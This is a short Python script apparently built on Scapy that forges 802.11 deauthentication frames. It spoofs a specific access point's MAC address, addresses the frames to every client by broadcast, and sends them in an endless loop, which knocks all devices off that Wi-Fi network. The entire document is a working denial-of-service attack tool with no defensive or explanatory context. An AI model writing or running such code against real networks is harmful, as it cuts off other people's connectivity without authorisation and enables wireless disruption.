from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth

target_mac = "FF:FF:FF:FF:FF:FF"
gateway_mac = "00:05:16:62:38:A3"
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# stack them up
packet = RadioTap()/dot11/Dot11Deauth(reason=7)

# send the packet
while True:
    sendp(packet, inter=0.1, iface="wlp2s0", verbose=0)
